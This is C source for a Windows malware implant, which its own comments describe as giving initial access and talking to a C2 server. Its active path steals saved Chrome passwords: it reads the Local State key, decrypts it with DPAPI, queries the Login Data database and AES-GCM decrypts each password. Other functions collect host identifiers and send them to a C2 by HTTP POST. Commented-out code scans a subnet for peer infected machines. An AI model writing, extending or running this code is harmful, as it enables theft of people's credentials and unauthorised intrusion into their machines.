/**************************************
 * This exe provides initial access
 * to a target network by establishing
 * persistence and http egress with the
 * linked C2 server
 * ***********************************/

// TODO
// Read environment variables
// List network interfaces
// Get Windows Version
// Retrieve username + token
// Retrieve computer name
// Retrieve machine GUID
// List files in directory
// Change directory
// List running processes

#include <tchar.h>
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <dirent.h>
#include <iphlpapi.h>
#include <zmq.h>
#include <sqlite3.h> //May need to be dynamically Linked for less carbon footprint
#include <aes_gcm.h>


// Use iphlpapi to get interface info
void NetworkInterfaces(){

}

// List environment variables
void EnvVariables(){

}

// Print all running processes
void RunningProcesses(){
    HANDLE hSnap;
    PROCESSENTRY32 ProcessStruct;
    ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    if(Process32First(hSnap, &ProcessStruct) == FALSE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    do{
        printf("%s\n", ProcessStruct.szExeFile);
    }while(Process32Next(hSnap, &ProcessStruct));
    CloseHandle(hSnap);
}

// Identify system using product ID
wchar_t* ProductID(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));
	DWORD size = 30*sizeof(wchar_t);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
    return value;
}

// Retrieve computer name
wchar_t* ComputerName(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
	return value;
}

// Retrieve current user
wchar_t* CurrentUser(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
	return value;
}

// Windows release
wchar_t* OSName(){
    wchar_t* name = (wchar_t*)malloc(30*sizeof(wchar_t));
    DWORD size = 30*sizeof(char);
    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
    return name;
}

// Windows build
wchar_t* OSVersion(){
    wchar_t* build = (wchar_t*)malloc(30*sizeof(wchar_t));
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
    return build;
}

//Get Local State
BYTE* getLocalState(){
    HANDLE hStateFile;
    DWORD LSFileSize;

    char* cLocalStatePath = (char*) malloc(1024);
    if (cLocalStatePath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cLocalStatePath,
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        getenv("USERPROFILE")
    );

    //Get Local State File Handle
    hStateFile = CreateFileA(
        cLocalStatePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hStateFile == INVALID_HANDLE_VALUE) {
        printf("Couldn't open Local State File %s\n", GetLastError());
    }

    //Get File Size
    LSFileSize = GetFileSize(hStateFile, NULL);
    if (LSFileSize == INVALID_FILE_SIZE){
        printf("Couldn't get file size with error: %s\n", GetLastError());
    };

    LPVOID fileContents = malloc(LSFileSize);
    if(!ReadFile(
        hStateFile,
        fileContents,
        LSFileSize,
        NULL,
        NULL
    )){
        printf("Critical error\n");
    }

    CloseHandle(hStateFile);
    return (BYTE*)fileContents; //Don't forget to free later
}

// Decrypt DPAPI
DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
    DATA_BLOB in;
    DATA_BLOB entropy;
    DATA_BLOB out;
    BYTE* entropyBuffer = (BYTE*) malloc (0);
    if (entropyBuffer == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    BYTE* outBuffer = (BYTE*)malloc(encryptBytesSize);
    //Setting DATA_BLOBS
    in.pbData = encryptedBytes;
    in.cbData = encryptBytesSize;
    entropy.pbData = entropyBuffer;
    entropy.cbData = (DWORD)0;
    out.cbData = encryptBytesSize;
    out.pbData = outBuffer;
    
    //DECRYPTING TIME!!!!
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
        return out;
    }
    else{
        printf("Decryption didn't work. ERROR %d", GetLastError());
        free(entropyBuffer);
        free(outBuffer);
        return out;
    }
}
/**
void Decrypt(BYTE* nonce, DWORD nonceLen, BYTE* data, DWORD datalen, char* hKey){



    NTSTATUS nStatus = BCryptDecrypt(
        hKey,
        data, dataLen,
        null,
        nonce, nonceLen,
        null, 0,
        &ptBufferSize, 0
    );
    if (!NT_SUCCESS(nStatus)){
         printf("**** Error 0x%x returned by BCryptGetProperty ><\n", nStatus);
         Cleanup();
         return;
    }
}
**/
//Get Encrpytion Key
DATA_BLOB getEncryptKey(){
    BYTE* localState = getLocalState();
    
    char* osCryptstr = (char*) malloc (1024);
    if (osCryptstr == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Parsing Strings
    char* token = strtok((char*)localState, ",");
    while (token != NULL) {
        if (strncmp(token, "\"os_crypt\"", strlen("\"os_crypt\"")) == 0){
            osCryptstr = token;
        }
        token = strtok(NULL, ",");
    }
    char* encryptKey = strtok(osCryptstr, "\"{}:");
    while (encryptKey != NULL) {
        if (strncmp(encryptKey, "os_crypt", strlen("os_crypt")) == 0 || strncmp(encryptKey, "encrypted_key", strlen("encrypted_key")) == 0) {
            encryptKey = strtok(NULL, "\"{}:");
        }
        else {
            token = encryptKey;
            encryptKey = strtok(NULL, "\"{}:");
        }
    }
    free(localState);

    DWORD keySize = strlen(token);
    DWORD bufSize = 0;
    // First Call to get length
    BOOL firstDecode = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, NULL, &bufSize, NULL, NULL);
    if (firstDecode == 0){
        printf("Trouble 1Decoding\n");
    };

    //Decoding
    BYTE* buffer = (BYTE*)malloc(keySize);
    if(buffer == NULL){
        printf("Memory not successfully allocated.\n");
    };
    BOOL decoded = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, buffer, &bufSize, NULL, NULL);
    if (decoded == 0) {
        printf("Trouble Decoding\n");
    };
    

    BYTE* finalKey = (BYTE*) malloc (bufSize-5);
    if (finalKey == NULL) {
        printf("Memory not successfully allocated.\n");
    };
    for(int i = 5; i < bufSize; i++){
        finalKey[i-5] = buffer[i];
    }
    free(buffer);
    
    DATA_BLOB masterKey = decryptDPAPI(finalKey, bufSize-5);
    return masterKey;
}

char* AESDecrypt(char* pass, DWORD passSize, BYTE* masterKey, DWORD masterKeySize){
    DWORD ivSize = 12;
    DWORD cipherTextSize = passSize - 15;
    DWORD ptBufferSize = 0;
    BCRYPT_ALG_HANDLE hAlg = 0;
    BCRYPT_KEY_HANDLE hKey = 0;
    printf("DEBUG PassSize: %d\n", passSize);

    printf("DEBUG FOR MASTER KEY!!!\n");
    for (int i = 0; i < masterKeySize; i++){
        printf(" %02x ", masterKey[i]);
    }

    BYTE* iv = (BYTE*) malloc (ivSize); 
    if(iv == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    printf("DEBUG PASS: %s\n", pass);
    for (int i = 3; i < 15; i++){
        iv[i-3] = pass[i];
    }
    
    printf("DEBUG IV %s\n", iv);
    for(int i = 0; i < ivSize; i++){
    printf(" %02x ", iv[i]);
    }
    
    BYTE* cipherText = (BYTE*) malloc (cipherTextSize);
    if(cipherText == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    for (int i = 15; i < passSize; i++){
        cipherText[i-15] = pass[i];
    }
    printf("DEBUG CIPHERTEXT %s\n", cipherText);
    for(int i = 0; i < cipherTextSize; i++){
        printf(" %02x ", cipherText[i]);
    }
    // create a handle to an AES-GCM provider
    NTSTATUS nStatAlg = ::BCryptOpenAlgorithmProvider(
        &hAlg, 
        BCRYPT_AES_ALGORITHM, 
        MS_PRIMITIVE_PROVIDER, 
        0);
    if (! NT_SUCCESS(nStatAlg))
    {
        printf("**** Error 0x%x returned by BCryptOpenAlgorithmProvider\n", nStatAlg);
    }
    if (!hAlg){
        printf("Invalid handle!\n");
    }


    BYTE* fodderBuffers = (BYTE*) malloc (64);
    if(fodderBuffers == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    NTSTATUS fodder2 = BCryptGetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        fodderBuffers,
        64,
        NULL,
        0
    );

    printf("DEBUG FOR ME: %s\n", fodderBuffers);

    NTSTATUS nStatProp = ::BCryptSetProperty(
        hAlg, 
        BCRYPT_CHAINING_MODE, 
        (BYTE*) BCRYPT_CHAIN_MODE_GCM, 
        sizeof(BCRYPT_CHAIN_MODE_GCM), 
        0);
    if (!NT_SUCCESS(nStatProp)){
         printf("**** Error 0x%x returned by BCryptGetProperty ><\n", nStatProp);
    }

    BYTE* fodderBuffer = (BYTE*) malloc (64);
    if(fodderBuffer == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    NTSTATUS fodder = BCryptGetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        fodderBuffer,
        64,
        NULL,
        0
    );
    printf("DEBUG FOR ME: %s\n", fodderBuffer);

    free(fodderBuffer);
    free(fodderBuffers);

    NTSTATUS nStatSymKey = ::BCryptGenerateSymmetricKey(
        hAlg, 
        &hKey, 
        NULL, 
        0, 
        masterKey, 
        masterKeySize, 
        0);
    if (!NT_SUCCESS(nStatSymKey)){
        printf("**** Error 0x%x returned by BCryptGenerateSymmetricKey\n", nStatSymKey);
    }

    BYTE* firstText = (BYTE*) malloc (1000);
    if(firstText == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    
    
    NTSTATUS nStatus = BCryptDecrypt(
        hKey, 
        cipherText, cipherTextSize, 
        NULL, 
        iv, ivSize,
        NULL, 0, 
        &ptBufferSize, 0);

    printf("DEBUG Buffer size %d\n", ptBufferSize);
    BYTE* plaintext = (BYTE*) malloc (ptBufferSize+1);
    if(plaintext == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    if(NT_SUCCESS(nStatus)){ 
        DWORD dwBytesDone = 0;
        NTSTATUS nFStatus = BCryptDecrypt(
            hKey, 
            cipherText, cipherTextSize, 
            NULL, 
            iv, ivSize, 
            plaintext, ptBufferSize, 
            &dwBytesDone, 0);
        if(!NT_SUCCESS(nFStatus)){
            printf("FAILED %32x", nFStatus);
        }
        printf("DEBUG PLAINTEXT %s", plaintext);
        return (char*) plaintext;
    };
    printf("DEBUG PLAINTEXT %s", plaintext);
    free(firstText);
    return (char*) ("error" + GetLastError());
}

// Decrypt Looted Chrome Passwords
char* Crack(char* pass, BYTE* encKey) {
    DATA_BLOB in;
    DATA_BLOB out;
    DATA_BLOB blobEntropy;
    DWORD passSize = strlen(pass);

    //Get Size of password
    /**
    BYTE storage[1024];
    memcpy(storage,pass,1024);
    int size = sizeof(storage) / sizeof(storage[0]);
    **/

    //Setting up DATA_BLOB in
    //in.pbData = pass;
    //in.cbData = size+1;

    char* decryptedPass = (char*) malloc(2048);
    if(decryptedPass == NULL) {
        printf("Memory not successfully Allocated.\n");
    }

    BYTE* iv = (BYTE*) malloc (14); 
    if(iv == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    for (int i = 3; i <= 15; i++){
        iv[i-3] = pass[i];
    }

    BYTE* cipherText = (BYTE*) malloc (passSize - 16);
    if(cipherText == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    for (int i = 15; i <= passSize; i++){
        cipherText[i-15] = pass[i];
    }

    DWORD ptBufferSize = 0;
    
    NTSTATUS nStatus = BCryptDecrypt(
        encKey, 
        cipherText, passSize-16, 
        NULL, 
        iv, 14,
        NULL, 0, 
        &ptBufferSize, 0);

    printf("First Error %d", GetLastError());
    if(NT_SUCCESS(nStatus)){ 
        BYTE* plaintext = (BYTE*) malloc (sizeof (BYTE) * (ptBufferSize+1));
        if(plaintext == NULL) {
            printf("Memory not successfully Allocated.\n");
        }
        DWORD dwBytesDone = 0;
        nStatus = BCryptDecrypt(
            encKey, 
            cipherText, passSize-16, 
            NULL, 
            iv, 14, 
            plaintext, ptBufferSize, 
            &dwBytesDone, 0);
        return (char*) plaintext;
    };

    free(decryptedPass);
    printf("Error %d", GetLastError());
    return (char*) "Error";
}

//Loot Chrome Passwords
wchar_t* GetPass(DATA_BLOB masterKey){
    char* cPassPath = (char*) malloc(512);
    if (cPassPath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cPassPath,
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        getenv("USERPROFILE")
    );

// THE REAL DEAL
    sqlite3_stmt* stmt;
    sqlite3* db;

    char *query = (char*) "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_open(cPassPath, &db) == SQLITE_OK) {
        if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
            //Begin Data Reading
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                //While we still have data in database
                char *url = (char*)sqlite3_column_text(stmt,0);
                char* username = (char*) sqlite3_column_text(stmt,1);
                char* password = (char*)sqlite3_column_text(stmt,2); //This is the only encrypted field
                DWORD passSize = sqlite3_column_bytes(stmt, 2);
                printf("DEBUG PASSWORD: %s\n", password);
                printf("Url: %s\n",url);
                if(username == NULL){
                    printf("Username: ");
                }
                else{
                printf("Username: %s\n",username);
                }
                
                char* decrypted =  AESDecrypt(password, passSize, masterKey.pbData, masterKey.cbData);
                if (decrypted != NULL){
                    printf("Password: %s\n", decrypted);
                }
            }
        }
        else{
            printf("Error preparing database with error %d\n", (sqlite3_prepare_v2(db, query, -1, &stmt, 0)));
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
    else {
        printf("Error opening database!\n");
    }

    free(cPassPath);
    return NULL;
}

// List files in directory
void ls(char* path){
    // Open context
    DIR *d;
    d = opendir(path);

    struct dirent *de;
    if (d != NULL){
        while ( de = readdir(d)){
            printf("%s\n", de->d_name);
        }
        closedir(d);
    }
}


void RegisterC2(){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                wchar_t* headers = (wchar_t*)L"Content-Type: application/json\r\n";
                char* jsonData = (char*) malloc(512);
                wchar_t* productID = ProductID();
                wchar_t* OSRelease = OSName();
                wchar_t* OSBuild = OSVersion();
                wchar_t* username = CurrentUser();
                wchar_t* computerName = ComputerName();
                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName);
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers,
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

/**
wchar_t* GetTasks(){

}
**/
int _tmain(int argc, _TCHAR *argv[]){

    if(argc == 1){
        // Report intrusion to C2
        // RegisterC2();
        DATA_BLOB encKey = getEncryptKey();
        GetPass(encKey);
    }
/**
        while(1){
            wchar_t* tasks = GetTasks();
            
            int jitter = (rand() % 20) - 10;
            Sleep(30+jitter);
        }
    }
**/
    // Do malware things (investigation, looting, persistence)

    // Situational Awareness tasks
    //RunningProcesses();
    //ls(".");
    //wchar_t* productID = ProductID();
    //printf("%s\n", productID);
    //ComputerName();
    //CurrentUser();
    //OSVersion();
    //NetworkInterfaces();


    /*

    // Establish peer network
    // Create a router for recieving messages
    void* context = zmq_ctx_new();
    void* router = zmq_socket(context, ZMQ_ROUTER);
    int success = zmq_bind(router, "tcp://*:8889");
    if (success != 0){

    }

    // Scan network for other infected machines
    // Brute force method
    void* dealer = zmq_socket(context, ZMQ_DEALER);
    for(int address = 1; address < 255; address++){
        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
    }


    // Timed loop for checking potential peers and retrieving commands from c2
    while(1){
        // Read router activity
        _TCHAR* buffer = malloc(64*sizeof(char));
        zmq_recv(router, buffer, 64, 0);
        printf("Incoming message: %s", buffer);
        Sleep(10000);
        zmq_send(dealer, buffer, 64, 0);
    }

    */
}